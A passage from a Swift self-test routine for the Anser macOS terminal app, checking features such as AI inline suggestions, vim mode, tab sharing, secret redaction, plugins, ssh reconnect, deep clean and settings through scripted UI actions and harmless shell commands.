                                      windowNumber: 0, context: nil, subtype: 0, data1: 0, data2: 0) { NSApp.postEvent(e, atStart: false) }
        await sleep(0.1)
        edt.setCommand("# biggest folders here")
        await sleep(0.05)
        check("a # line offers AI on Tab", edt.isAIRequest && pane.hintText.contains("Tab asks"), pane.hintText)
        edt.askAIInline()
        ok = await wait(5) { edt.string == "du -sh * | sort -h" }
        check("# description + Tab becomes the command", ok, edt.string)
        snap(pane, "ai-inline")
        await sleep(0.1)
        let um = edt.undoManager
        let diag = "level \(um?.groupingLevel ?? -1) · canUndo \(um?.canUndo ?? false) · same manager as window: \(um === wc.window?.undoManager)"
        edt.breakUndoCoalescing()
        edt.undoManager?.undo()     // what ⌘Z does in the editor (sent straight to it: other test windows may be in front)
        let afterOne = edt.string
        check("⌘Z brings your words back", afterOne == "# biggest folders here", "after ⌘Z: '\(afterOne)' · \(diag) · first responder is editor: \(wc.window?.firstResponder === edt)")
        Services.shared.aiForcedOn = hadAI
        Services.shared.aiOverride = oldAI
        Services.shared.setVimForTest(true)
        func key(_ c: String, _ code: UInt16 = 0) {
            if let e = NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: [], timestamp: 0, windowNumber: wc.window?.windowNumber ?? 0,
                                        context: nil, characters: c, charactersIgnoringModifiers: c, isARepeat: false, keyCode: code) { edt.keyDown(with: e) }
        }
        edt.setCommand("echo hello world")
        await sleep(0.05)   // real key presses each arrive in their own event (and undo step)
        key("\u{1b}", 53)
        check("Esc enters vim normal mode", edt.vimNormal && pane.hintText.contains("NORMAL"))
        snap(pane, "vim-normal")
        key("0"); key("w")
        await sleep(0.05)
        check("0 and w move like vim", edt.selectedRange().location == 5, "\(edt.selectedRange().location)")
        key("d"); key("w")
        await sleep(0.05)
        check("dw deletes a word", edt.string == "echo world", edt.string)
        key("u")
        check("u undoes", edt.string == "echo hello world", edt.string)
        key("A")
        check("A appends (back to typing)", !edt.vimNormal && edt.selectedRange().location == (edt.string as NSString).length)
        Services.shared.setVimForTest(false)
        edt.clear()

        // ---- Timing, blame, find in all tabs, pictures, sharing, VoiceOver ----
        let hist = Services.shared.history
        let timed = "sleep 2 # anser-selftest-timing"
        for d in [4.0, 4.0] { let id = hist.recordStart(command: timed, cwd: tmp, session: nil); hist.recordFinish(id: id, exitCode: 0, duration: d) }
        check("history knows how long a command usually takes", PaneView.usefulTiming(for: timed)?.typical == 4)
        pane.run(timed)
        ok = await wait(3) { pane.runningLabelText.contains("usually 4.0s") }
        check("a running command shows its usual time", ok, pane.runningLabelText)
        snap(pane, "timing")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command == timed }

        // A clean repository (the main test folder is set up as an unsafe one on purpose).
        let blameRepo = tmp + "/blame-repo"
        try? FileManager.default.removeItem(atPath: blameRepo)
        try? FileManager.default.createDirectory(atPath: blameRepo, withIntermediateDirectories: true)
        _ = await ScriptRunner.shared.run("git init -q && printf 'first line\\nsecond line\\n' > blame-me.txt && git add blame-me.txt && git -c user.email=t@t -c user.name=Tester commit -qm 'add blame file'",
                                          cwd: blameRepo, env: s.env, timeout: 5)
        wc.showBlame(for: pane, path: blameRepo + "/blame-me.txt", line: 2)
        ok = await wait(5) { openPicker()?.itemTitles.contains { $0.contains("second line") } == true && openPicker()?.selectedRowIndex == 1 }
        check("blame opens at the line you asked about", ok, openPickerTitles().joined(separator: " | "))
        if let p = openPicker() {
            _ = await wait(3) { p.previewString.contains("add blame file") }
            check("blame shows who changed it and the commit", p.previewString.contains("add blame file") && (p.itemTitles.first.map { _ in true } ?? false))
            snapView(p.contentView!, "picker-blame")
        }
        closePickers()

        pane.run("echo anser-alltabs-$((7*6)) # anser-selftest")
        ok = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("alltabs") == true }
        await sleep(0.5)
        let homeTab = wc.selectedIndex
        wc.addTab(cwd: tmp)
        let otherPane = wc.focusedPane!
        _ = await wait(20) { otherPane.session.integrated && otherPane.session.atPrompt }
        wc.showSearchAllTabs(for: otherPane)
        ok = await wait(3) { openPicker() != nil }
        if let p = openPicker() {
            p.setQuery("alltabs-42")
            ok = await wait(3) { p.refresh(); return p.itemTitles.contains { $0.contains("anser-alltabs-42") } }
            check("Search → All tabs finds output from another tab", ok, p.itemTitles.prefix(3).joined(separator: " | "))
            p.acceptSelectedForTest()
            ok = await wait(2) { wc.selectedIndex == homeTab }
            check("choosing a result goes to its tab", ok)
        }
        closePickers()
        wc.closeTab(wc.tabs.count - 1)
        wc.selectTab(homeTab)

        pane.run(#"printf '\033_Gi=31,s=1,v=1,a=q,t=d,f=24;AAAA\033\\'; read -rs -t 2 -d '\' r; [[ $r == *OK* ]] && echo kitty-graphics-ok # anser-selftest"#)
        ok = await wait(8) { (pane.surfaceView.viewportText() ?? "").contains("kitty-graphics-ok") }
        check("the terminal shows pictures (kitty graphics)", ok)
        pane.run("whence -w imgcat # anser-selftest")
        ok = await wait(5) { (pane.surfaceView.viewportText() ?? "").contains("imgcat: ") }
        check("imgcat is available", ok && !(pane.surfaceView.viewportText() ?? "").contains("imgcat: none"))

        var share: TabShare?
        TabShare.start(for: pane) { share = $0 }
        ok = await wait(3) { share != nil }
        check("sharing a tab starts a read-only page", ok, share?.link ?? "no share")
        if let share {
            let page = try? await URLSession.shared.data(from: URL(string: share.localLink)!)
            let html = page.map { String(decoding: $0.0, as: UTF8.self) } ?? ""
            let bad = try? await URLSession.shared.data(from: URL(string: "http://127.0.0.1:\(share.port)/s/not-the-secret")!)
            check("the page needs the secret link", html.contains("read-only") && (bad?.1 as? HTTPURLResponse)?.statusCode == 404)
            pane.run("echo anser-share-$((6*7)) # anser-selftest")
            _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("anser-share") == true }
            let seen = SentBodies()
            let reader = Task {
                if let (bytes, _) = try? await URLSession.shared.bytes(from: URL(string: share.localLink + "/events")!) {
                    for try await line in bytes.lines where line.contains("anser-share-42") { seen.add(line); break }
                }
            }
            ok = await wait(6) { !seen.all.isEmpty }
            check("viewers see the tab's screen live", ok)
            pane.layoutSubtreeIfNeeded()
            snap(pane, "sharing")
            reader.cancel()
            share.stop()
            check("sharing stops", TabShare.share(for: pane) == nil)
        }

        // ---- Live tools: waiting, servers, cloud context, filter, tasks, secrets, reconnect, compare, data ----
        let live = NSTemporaryDirectory() + "anser-st-live"
        try? FileManager.default.removeItem(atPath: live)
        try? FileManager.default.createDirectory(atPath: live, withIntermediateDirectories: true)

        // Waiting for an answer.
        pane.run("read -q 'REPLY?Proceed? [y/N] ' ; echo answered # anser-selftest")
        ok = await wait(8) { pane.waitState?.kind == .confirm }
        check("a y/n prompt marks the pane as waiting", ok, pane.waitState?.line ?? "none")
        check("the tab shows it's waiting", wc.tab(for: pane).map { wc.activity(of: $0) } == .waiting)
        pane.layoutSubtreeIfNeeded()
        check("the waiting chip shows", !pane.waitChip.isHidden && pane.waitChip.text.contains("y/n"), pane.waitChip.text)
        snap(pane, "waiting")
        pane.surfaceView.sendText("n")
        ok = await wait(6) { s.atPrompt && pane.waitState == nil }
        check("answering clears the waiting state", ok)

        // Servers a tab started.
        let port = 48000 + Int.random(in: 0..<900)
        pane.run("python3 -m http.server \(port) --bind 127.0.0.1 # anser-selftest")
        ok = await wait(15) {
            ServerMonitor.shared.check()
            return ServerMonitor.shared.servers(for: pane).contains { $0.port == port }
        }
        check("a server the tab started is found", ok, ServerMonitor.shared.servers(for: pane).map { "\($0.process):\($0.port)" }.joined(separator: ","))
        pane.refreshBar()
        pane.layoutSubtreeIfNeeded()
        check("the server chip shows its port", pane.serverChip.text.contains(":\(port)"), pane.serverChip.text)
        snap(pane, "server-chip")
        if let srv = ServerMonitor.shared.servers(for: pane).first(where: { $0.port == port }) { ServerMonitor.stop(pid: srv.pid) }
        ok = await wait(8) { s.atPrompt }
        check("stopping the server ends the command", ok)
        ok = await wait(8) { ServerMonitor.shared.check(); return ServerMonitor.shared.servers(for: pane).isEmpty }
        check("the server chip goes away", ok)

        // Cloud context chip from KUBECONFIG, and a profile for a prod cluster.
        let kubeFile = live + "/kubeconfig"
        try? "contexts:\n- context:\n    cluster: c\n    namespace: payments\n  name: st-prod-eu\n- context:\n    cluster: d\n  name: st-dev\ncurrent-context: st-prod-eu\n"
            .write(toFile: kubeFile, atomically: true, encoding: .utf8)
        pane.run("export KUBECONFIG=\(ShellLexer.escape(kubeFile)) # anser-selftest")
        ok = await wait(6) { s.atPrompt && s.cloudVars.kubeconfig == kubeFile }
        check("the shell reports KUBECONFIG", ok, s.cloudVars.kubeconfig ?? "nil")
        var prodProfile = Profile(name: "prod cluster", tabColor: "red", badge: "PROD", confirm: ["*delete*"])
        prodProfile.kubeContext = "st-prod*"
        Services.shared.setProfilesForTest([prodProfile])
        pane.cloudCache = nil
        pane.editor.setCommand("kubectl get pods")
        pane.editorContentChanged()
        pane.refreshBar()
        pane.layoutSubtreeIfNeeded()
        check("the context chip shows the cluster and badge", pane.contextChip.text.contains("PROD") && pane.contextChip.text.contains("st-prod-eu/payments"), pane.contextChip.text)
        snap(pane, "context-chip")
        check("risky commands on that cluster ask first", pane.contextProfile(for: "kubectl delete pod web")?.needsConfirmation("kubectl delete pod web") == true
              && pane.contextProfile(for: "ls") == nil)
        Services.shared.setProfilesForTest([])
        pane.editor.setCommand("")
        pane.run("unset KUBECONFIG # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cloudVars.kubeconfig == nil }
        pane.cloudCache = nil
        pane.refreshBar()

        // Filter output.
        pane.run("printf 'ok 1\\nerror: boom\\nok 2\\nwarning: hmm\\nDownloading 1/3\\nDownloading 2/3\\nDownloading 3/3\\n' # anser-selftest")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("Downloading") == true }
        await sleep(0.4)
        pane.toggleFilterPanel()
        if let fp = pane.filterPanel {
            fp.setForTest(query: "", level: 2)
            check("filter shows errors only", fp.shown.map(\.text) == ["error: boom"], fp.shown.map(\.text).joined(separator: " | "))
            fp.setForTest(query: "", level: 0)
            check("filter folds repeated lines", fp.shown.contains { $0.count == 3 && $0.text.hasPrefix("Downloading 3/3") }, fp.shown.map { "\($0.text)×\($0.count)" }.joined(separator: " | "))
            fp.setForTest(query: "boom", level: 0)
            pane.layoutSubtreeIfNeeded()
            snap(pane, "filter")
            pane.toggleFilterPanel()
        }
        check("filter panel opens and closes", pane.filterPanel == nil)

        // Project tasks in the sidebar.
        try? #"{"scripts":{"dev":"vite","test":"vitest"}}"#.write(toFile: live + "/package.json", atomically: true, encoding: .utf8)
        try? "build: ## compile\n\techo built\n".write(toFile: live + "/Makefile", atomically: true, encoding: .utf8)
        pane.run("cd \(ShellLexer.escape(live)) # anser-selftest")
        _ = await wait(5) { s.atPrompt && s.cwd == live }
        check("project tasks are found", ProjectTasks.find(from: s.cwd)?.tasks.map(\.name) == ["dev", "test", "build"],
              ProjectTasks.find(from: s.cwd)?.tasks.map(\.name).joined(separator: ",") ?? "none")
        wc.tabBar.clickSidebarButton()
        ok = await wait(5) { wc.sidebar.sectionTitles.contains { $0.hasPrefix("TASKS") } }
        check("the sidebar lists project tasks", ok, wc.sidebar.sectionTitles.joined(separator: ", "))
        wc.window?.contentView?.layoutSubtreeIfNeeded()
        snapView(wc.sidebar, "sidebar-tasks")
        wc.tabBar.clickSidebarButton()

        // Secrets: filled in as the command runs, never kept.
        SecretBroker.testValues = ["st-token": "s3cr3t-v4lue"]
        pane.run("echo got-{{secret:st-token}}-done # anser-selftest")
        ok = await wait(8) { s.atPrompt && (pane.surfaceView.viewportText() ?? "").contains("got-s3cr3t-v4lue-done") }
        check("a {{secret:…}} is filled in when the command runs", ok)
        let kept = Services.shared.history.entries(session: s.id, limit: 3).first?.command ?? ""
        check("history keeps {{secret:…}}, not the value", kept.contains("{{secret:st-token}}") && !kept.contains("s3cr3t"), kept)
        check("the command block keeps it too", s.blocks.last?.command.contains("{{secret:st-token}}") == true)
        SecretBroker.testValues = nil

        // Compare with the previous run.
        let cmpCmd = "[[ -f st-cmp ]] && echo second-run || echo first-run; touch st-cmp # anser-selftest"
        pane.run(cmpCmd)
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command == cmpCmd }
        await sleep(0.5)
        pane.run(cmpCmd)
        _ = await wait(6) { s.atPrompt && s.blocks.filter { $0.command == cmpCmd }.count == 2 }
        await sleep(0.6)
        if let i = s.blocks.indices.last { pane.captureOutput(forBlockAt: i) }
        await sleep(0.3)
        DiffViewer.openViewers.forEach { $0.close() }
        if let i = s.blocks.indices.last { pane.compareWithPreviousRun(block: i) }
        let dv = DiffViewer.openViewers.first
        check("compare shows what changed since the last run", dv?.lastSummary.added == 1 && dv?.lastSummary.removed == 1,
              "\(dv?.lastSummary.added ?? -1)+ \(dv?.lastSummary.removed ?? -1)-")
        if let dv, let v = dv.contentView { snapView(v, "compare") }
        DiffViewer.openViewers.forEach { $0.close() }

        // Table viewer.
        pane.run("printf 'NAME   READY   AGE\\nweb    1/1     5d\\napi    0/1     12m\\n' # anser-selftest")
        _ = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("READY") == true }
        await sleep(0.6)
        if let i = s.blocks.indices.last { pane.captureOutput(forBlockAt: i); await sleep(0.3); pane.viewOutputAsData(block: i) }
        if let v = DataViewer.openViewers.first {
            check("column output opens as a table", v.rowCountForTest == 2)
            v.sortForTest(column: 0, ascending: true)
            check("the table sorts by a column", v.firstRowForTest?.first == "api", v.firstRowForTest?.joined(separator: " ") ?? "")
            v.filterForTest("web")
            check("the table filters rows", v.rowCountForTest == 1)
            if let c = v.contentView { snapView(c, "table") }
        } else {
            check("column output opens as a table", false, "no viewer")
        }
        DataViewer.openViewers.forEach { $0.close() }

        // Reconnecting a dropped ssh session (a stand-in ssh that "drops" after 9 seconds).
        pane.run("ssh() { sleep 9; return 255; } # anser-selftest")
        _ = await wait(5) { s.atPrompt }
        pane.run("ssh st-host # anser-selftest")
        ok = await wait(16) { pane.reconnect != nil && s.atPrompt }
        check("a dropped ssh session offers to reconnect", ok)
        pane.refreshBar()
        pane.layoutSubtreeIfNeeded()
        check("the reconnect chip counts down", pane.reconnectChip.text.contains("reconnecting"), pane.reconnectChip.text)
        snap(pane, "reconnect")
        ok = await wait(6) { pane.reconnect?.attemptRunning == true && s.running != nil }
        check("it reconnects by itself", ok, s.running?.command ?? "not running")
        check("history keeps the command you typed", s.running?.command == "ssh st-host # anser-selftest", s.running?.command ?? "")
        pane.reconnect?.timer?.invalidate()
        pane.reconnect = nil
        pane.sendControl("c")
        _ = await wait(5) { s.atPrompt }
        pane.reconnect?.timer?.invalidate()
        pane.reconnect = nil
        pane.run("unset -f ssh # anser-selftest")
        _ = await wait(5) { s.atPrompt }
        pane.refreshBar()

        // Sharing with a code.
        var coded: TabShare?
        TabShare.start(for: pane, requireCode: true) { coded = $0 }
        ok = await wait(3) { coded != nil }
        if let coded, let code = coded.code {
            func status(_ path: String) async -> Int {
                let r = try? await URLSession.shared.data(from: URL(string: coded.localLink + path)!)
                return (r?.1 as? HTTPURLResponse)?.statusCode ?? -1
            }
            let noCode = await status("/events")
            let wrong = await status("/check?code=" + (code == "0000" ? "1111" : "0000"))
            let right = await status("/check?code=" + code)
            check("a shared tab can require a code", noCode == 403 && wrong == 403 && right == 200, "\(noCode) \(wrong) \(right)")
            coded.stop()
        } else {
            check("a shared tab can require a code", false, "didn't start")
        }

        // Plugins: a chip, actions, a sidebar section and an after-command hook.
        let pdir = live + "/plugins"
        let pfolder = pdir + "/st-plugin"
        try? FileManager.default.createDirectory(atPath: pfolder, withIntermediateDirectories: true)
        try? """
        {"name": "Self-test plugin", "description": "test",
         "chips": [{"id": "hello", "script": "echo '{\\"text\\":\\"plugin-chip-ok\\",\\"color\\":\\"green\\",\\"run\\":\\"echo chip-clicked # anser-selftest\\"}'"},
                   {"id": "never", "script": "echo hidden", "when": ["no-such-file.xyz"]}],
         "actions": [{"title": "St plugin run", "run": "echo plugin-action-ran # anser-selftest"},
                     {"title": "St plugin script", "script": "echo script-said-hi"}],
         "sidebar": [{"title": "St rows", "script": "printf 'row one\\tdetail\\techo row-ran # anser-selftest\\nrow two\\n'"}],
         "hooks": {"commandFinished": "./hook.sh"}}
        """.write(toFile: pfolder + "/plugin.json", atomically: true, encoding: .utf8)
        try? "#!/bin/sh\necho \"$ANSER_EXIT $ANSER_COMMAND\" >> \"$ANSER_PLUGIN_DIR/hook.log\"\n".write(toFile: pfolder + "/hook.sh", atomically: true, encoding: .utf8)
        chmod(pfolder + "/hook.sh", 0o755)
        try? FileManager.default.createDirectory(atPath: pdir + "/broken", withIntermediateDirectories: true)
        try? "{ not json".write(toFile: pdir + "/broken/plugin.json", atomically: true, encoding: .utf8)
        PluginHost.directory = pdir
        PluginHost.shared.enabledOverride = []
        PluginHost.shared.reload()
        check("plugins are found, and broken ones reported", PluginHost.shared.plugins.map(\.id) == ["st-plugin"] && PluginHost.shared.errors.count == 1,
              PluginHost.shared.errors.joined(separator: "; "))
        pane.run("true # anser-selftest")
        _ = await wait(4) { s.atPrompt }
        await sleep(0.8)
        check("a plugin does nothing until it's turned on", PluginHost.shared.chips(for: pane).isEmpty && !FileManager.default.fileExists(atPath: pfolder + "/hook.log"))
        PluginHost.shared.enabledOverride = ["st-plugin"]
        PluginHost.shared.reload()
        ok = await wait(6) { PluginHost.shared.chips(for: pane).first?.chip.text == "plugin-chip-ok" }
        pane.refreshBar()
        pane.layoutSubtreeIfNeeded()
        check("a plugin chip shows in the status row", ok && pane.pluginChipViews.contains { $0.text == "plugin-chip-ok" && !$0.isHidden },
              PluginHost.shared.chips(for: pane).map(\.chip.text).joined(separator: ","))
        check("a chip whose files are missing stays hidden", PluginHost.shared.chips(for: pane).count == 1)
        snap(pane, "plugin-chip")
        check("plugin actions are in the palette", PluginHost.shared.actions.map(\.action.title) == ["St plugin run", "St plugin script"])
        if let a = PluginHost.shared.actions.first { PluginHost.shared.perform(a, in: pane) }
        ok = await wait(6) { s.atPrompt && s.blocks.last?.command.contains("plugin-action-ran") == true }
        check("a plugin action runs its command", ok)
        ok = await wait(6) { ((try? String(contentsOfFile: pfolder + "/hook.log", encoding: .utf8)) ?? "").contains("0 echo plugin-action-ran") }
        check("a plugin hook runs after commands", ok)
        ok = await wait(6) { PluginHost.shared.sections(for: pane).first?.rows.count == 2 }
        check("a plugin adds a sidebar section", ok && PluginHost.shared.sections(for: pane).first?.rows.first?.run?.contains("row-ran") == true)
        PluginHost.shared.enabledOverride = nil
        PluginHost.directory = PluginRegistry.defaultDirectory
        PluginHost.shared.reload()
        pane.refreshBar()


        await workToolChecks(pane, wc, live: live, tmp: tmp)
        await habitChecks(pane, wc, live: live, tmp: tmp)
        await moreToolChecks(pane, wc, live: live, tmp: tmp)
        await uiChecks(pane, wc, live: live, tmp: tmp)
        await savedAndInsightsChecks(pane, wc, tmp: tmp)
        await uxReviewChecks(pane, wc, tmp: tmp)
        await stopChecks(pane)
        // Sharing one command, and startup timing.
        let shareMD = PaneView.shareMarkdown(command: "curl -H 'Authorization: Bearer abc.def.ghi' x", output: "token=ghp_abcdefghijklmnopqrstuvwxyz0123\nok",
                                        exitCode: 0, duration: 1.2, cwd: NSHomeDirectory())
        check("sharing a command removes secrets", shareMD.contains("[redacted]") && !shareMD.contains("ghp_abcdef") && shareMD.contains("ok"), shareMD)
        check("startup time is measured", Startup.totalMilliseconds != nil, Startup.summary)

        // What's New and links.
        check("What's New lists the new features", WhatsNew.items.count >= 8 && WhatsNewWindowController.shared.window != nil)
        check("anser:// links parse", AnserLink.parse(URL(string: "anser://run?dir=/tmp&cmd=ls")!)?.command == "ls")
        check("every new action is in the palette", [AnserAction.filterOutput, .killPort, .compareLastRun, .viewOutputAsData, .manageSecrets, .whatsNew]
              .allSatisfy { !$0.title.isEmpty })
        pane.run("cd \(ShellLexer.escape(tmp)) # anser-selftest")
        _ = await wait(5) { s.atPrompt }

        func unlabeled(_ v: NSView) -> [String] {
            var out: [String] = []
            for sub in v.subviews where !sub.isHidden {
                if let b = sub as? NSButton, b.title.isEmpty, (b.accessibilityLabel() ?? "").isEmpty, (b.toolTip ?? "").isEmpty {
                    out.append(b.image?.accessibilityDescription ?? String(describing: Swift.type(of: b)))
                }
                out += unlabeled(sub)
            }
            return out
        }
        let missing = unlabeled(wc.window!.contentView!)
        check("every visible button has a label for VoiceOver", missing.isEmpty, missing.joined(separator: ", "))

        // Shell clear with scrollback preserved. The live cursor moves to the top.
        // (Following is off by default, and config reloads earlier in the test turn the override off.)
        Services.shared.setEditorFollowsOutputForTest(true)
        pane.run("echo anser-scrollback-$((6*7)) # anser-selftest")
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-scrollback") == true }
        pane.run("clear -x # anser-selftest")
        ok = await wait(10) {
            pane.layoutSubtreeIfNeeded()
            return s.atPrompt && s.blocks.last?.command.hasPrefix("clear -x") == true
                && pane.followTop != nil && !(pane.surfaceView.viewportText() ?? "").contains("anser-scrollback-42")
        }
        check("shell clear leaves the editor following the live prompt", ok,
              "follow=\(Services.shared.config.editorFollowsOutput) top=\(String(describing: pane.followTop)) full=\(pane.fullscreenProgram) exp=\(pane.editorExpanded) ed=\(pane.editorEnabled) last=\(s.blocks.last?.command ?? "")")
        // The terminal only reports scrolling while it draws: make sure its window is in front.
        NSApp.activate(ignoringOtherApps: true)
        wc.window?.makeKeyAndOrderFront(nil)
        _ = await wait(3) { wc.window?.occlusionState.contains(.visible) == true }
        pane.surfaceView.binding("scroll_page_up")
        ok = await wait(3) {
            pane.layoutSubtreeIfNeeded()
            return (pane.surfaceView.viewportText() ?? "").contains("anser-scrollback-42")
                && pane.followTop == nil && pane.surfaceView.frame.minY >= pane.barTopForTest - 0.5
        }
        check("scrollback after shell clear stays above the input bar", ok,
              "vis=\(pane.window?.occlusionState.contains(.visible) ?? false) key=\(pane.window?.isKeyWindow ?? false) wins=\(NSApp.windows.filter(\.isVisible).map { $0.title.isEmpty ? String(describing: Swift.type(of: $0)) : $0.title }.joined(separator: "|")) atBottom=\(pane.viewportAtBottom) seen=\((pane.surfaceView.viewportText() ?? "").contains("anser-scrollback-42")) top=\(String(describing: pane.followTop)) surf=\(pane.surfaceView.frame.minY) bar=\(pane.barTopForTest)")
        pane.surfaceView.binding("scroll_to_bottom")
        ok = await wait(3) {
            pane.layoutSubtreeIfNeeded()
            return pane.followTop != nil && !(pane.surfaceView.viewportText() ?? "").contains("anser-scrollback-42")
        }
        check("returning to live output restores editor following", ok)
        // Back to the default: the input bar at the bottom for the rest of the run.
        Services.shared.setEditorFollowsOutputForTest(false)
        pane.needsLayout = true

        // ---- Clear and Deep Clean ----
        pane.run("echo anser-clear-$((5*5)) # anser-selftest")
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("anser-clear") == true }
        await sleep(0.3)
        pane.clearScreen()
        ok = await wait(2) { !(pane.surfaceView.viewportText() ?? "").contains("anser-clear-25") }
        check("Clear wipes the screen", ok)
        check("Clear keeps the tab's command list", s.blocks.contains { $0.command.contains("anser-clear") })
        if s.persistent {
            let bytes = SessionHost.shared.request(["cmd": "replaySize", "id": s.id])?["bytes"] as? Int ?? -1
            check("Clear also wipes the copy kept for restarts", bytes >= 0 && bytes < 600, "\(bytes) bytes")
        }
        pane.confirmDeepClean()
        ok = await wait(2) { pane.lastConfirmation?.messageText == "Deep clean this tab?" }
        check("Deep Clean history option opens a dialog", ok)
        if let w = pane.window, let sheet = w.attachedSheet { w.endSheet(sheet, returnCode: .alertSecondButtonReturn) }
        // Garble the terminal on purpose: DEC line drawing turns q into ─ (what cat-ing a binary file can do).
        pane.run(#"printf '\033(0' # anser-selftest"#)
        _ = await wait(10) { s.atPrompt && s.blocks.last?.command.contains("033(0") == true }
        pane.focus()
        let viewMenu = NSApp.mainMenu?.items.compactMap(\.submenu).first { $0.title == "View" }
        let deepCleanItem = viewMenu?.items.first { $0.representedObject as? String == AnserAction.deepClean.rawValue }
        let shortcutBound = deepCleanItem?.keyEquivalent == "k"
            && deepCleanItem?.keyEquivalentModifierMask == [.command, .shift]
        if let deepCleanItem, let action = deepCleanItem.action {
            NSApp.sendAction(action, to: deepCleanItem.target, from: deepCleanItem)
        }
        ok = await wait(2) { s.blocks.isEmpty }
        check("Deep Clean shortcut runs without a dialog", shortcutBound && ok && pane.window?.attachedSheet == nil)
        check("Deep Clean shortcut keeps saved History",
              Services.shared.history.search("anser-clear-", scope: .all).contains { $0.0.command.contains("anser-clear-$((5*5))") })
        pane.run("echo abcq-deep # anser-selftest")
        ok = await wait(10) { (pane.surfaceView.viewportText() ?? "").contains("abcq-deep") }
        check("Deep Clean resets the terminal (text reads normally again)", ok, (pane.surfaceView.viewportText() ?? "").suffix(80).description)
        _ = await wait(5) { s.atPrompt && s.blocks.last?.command.contains("abcq-deep") == true }
        pane.deepClean(removeFromHistory: true)
        // History search is fuzzy, so look for the exact command.
        ok = await wait(3) { !Services.shared.history.search("abcq-deep", scope: .all).contains { $0.0.command == "echo abcq-deep # anser-selftest" } }
        check("and can remove them from History", ok)
        snap(pane, "deep-clean", full: true)

        // ---- Folder menu on the folder chip; Split Left / Up ----
        let folderMenu = FileActions.folderMenu(tmp, pane: pane).items.filter { !$0.isSeparatorItem }.map(\.title)
        check("the folder under the editor has a right-click menu",
              Array(folderMenu.prefix(5)) == ["cd Here (you're here)", "New Tab Here", "New Window Here", "Open in Finder", "Copy Path"],
              folderMenu.joined(separator: ", "))
        check("…and the folder chip offers it", pane.folderChipMenuTitles.contains("New Window Here"))
        wc.split(pane, vertical: true, before: true)
        let leftPane = wc.allPanes.first { $0 !== pane }
        let leftOK = leftPane.map { $0.frame.minX < pane.frame.minX } ?? false
        check("Split Left puts the new pane on the left", wc.allPanes.count == 2 && leftOK)
        if let leftPane { wc.close(leftPane) }
        wc.split(pane, vertical: false, before: true)
        let upPane = wc.allPanes.first { $0 !== pane }
        // In the split view, the first subview is the upper one.
        let upOK = (upPane?.superview as? NSSplitView).map { $0.arrangedSubviews.first === upPane } ?? false
        check("Split Up puts the new pane above", wc.allPanes.count == 2 && upOK)
        if let upPane { wc.close(upPane) }
        let shellMenu = NSApp.mainMenu?.items.first { $0.submenu?.title == "Shell" }?.submenu?.items.map(\.title) ?? []
        check("Shell menu has Split Left and Split Up", shellMenu.contains("Split Left") && shellMenu.contains("Split Up"))
        pane.focus()

        // ---- Dock menu ----
        let dock = AppDelegate.shared.applicationDockMenu(NSApp)?.items.map(\.title) ?? []
        check("Dock icon menu offers New Window and New Tab", dock.starts(with: ["New Window", "New Tab"]), dock.joined(separator: ", "))
        let tabsBefore = wc.tabs.count
        AppDelegate.shared.dockNewTab(nil)
        ok = await wait(3) { wc.tabs.count == tabsBefore + 1 }
        check("Dock → New Tab opens a tab in the front window", ok, "\(tabsBefore) → \(wc.tabs.count)")
        if ok { wc.closeTab(wc.tabs.count - 1) }
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- Default terminal: folders open as tabs (nothing system-wide is changed here) ----
        let tabsBeforeOpen = wc.tabs.count
        let openDir = tmp + "/opened-folder"
        try? FileManager.default.createDirectory(atPath: openDir, withIntermediateDirectories: true)
        AppDelegate.shared.handleOpen(URL(fileURLWithPath: openDir))
        ok = await wait(15) { wc.tabs.count == tabsBeforeOpen + 1 && wc.focusedPane?.session.cwd.hasSuffix("opened-folder") == true }
        check("a folder dropped on the Dock icon opens a tab there", ok, wc.focusedPane?.session.cwd ?? "")
        if wc.tabs.count > tabsBeforeOpen { wc.closeTab(wc.tabs.count - 1) }
        let appItems = NSApp.mainMenu?.items.first?.submenu?.items.map(\.title) ?? []
        check("app menu offers to make Anser the default terminal", appItems.contains { $0.contains("Default Terminal") }, appItems.joined(separator: ", "))
        wc.window?.makeKeyAndOrderFront(nil)

        // ---- New menus ----
        let allItems = (NSApp.mainMenu?.items ?? []).flatMap { $0.submenu?.items ?? [] }.map(\.title)
        check("menus for the new features", ["Search Output…", "Type in All Panes of This Tab", "Resolve Conflicts…", "Open Pull Request",
                                             "Check for Updates…", "Import from iTerm2 or Warp…", "Your Feature Usage…"].allSatisfy(allItems.contains),
              allItems.filter { $0.contains("…") }.count.description)

        // Settings window.
        SettingsWindowController.shared.show()
        await sleep(0.3)
        for (i, name) in ["appearance", "editor", "notifications", "helpers", "privacy", "sessions", "ai", "shortcuts", "profiles", "plugins", "advanced"].enumerated() {
            SettingsWindowController.shared.selectSection(i)
            await sleep(0.2)
            if let v = SettingsWindowController.shared.window?.contentView { snapView(v, "settings-\(name)") }
        }
        SettingsWindowController.shared.show(section: "Profiles")
        check("settings has Shortcuts and Profiles pages", SettingsWindowController.shared.selectedSectionName == "Profiles")
        let hits = SettingsWindowController.shared.searchHits("reconnect ssh")
        check("settings search finds a setting", hits.first?.section == "Suggestions & Helpers", hits.map { "\($0.section): \($0.text)" }.joined(separator: " | "))
        SettingsWindowController.shared.selectSection(0)
        SettingsWindowController.shared.close()

        // Splits and layout snapshot.
        wc.split(pane, vertical: true)
        check("split creates a second pane", wc.allPanes.count == 2)
        let second = wc.allPanes.last!
        ok = await wait(30) { second.session.integrated && second.session.atPrompt }
        check("new pane starts in the same folder", ok && second.session.cwd.hasSuffix("anser-selftest"), second.session.cwd)
        if case .split(let vertical, let children, _)? = wc.snapshot() {
            check("layout snapshot for session restore", vertical && children.count == 2)
        } else {
            check("layout snapshot for session restore", false)
        }
        let previousText = pane.editor.string
        let previousSelection = pane.editor.selectedRange()
        let draftText = "echo anser-draft-fixture 😀\necho second line"
        pane.editor.setCommand(draftText)
        pane.editor.setSelectedRange(NSRange(location: 10, length: 0))
        second.editor.setCommand("echo token=fixture-secret")
        if let data = try? JSONEncoder().encode(wc.snapshotTabs()),
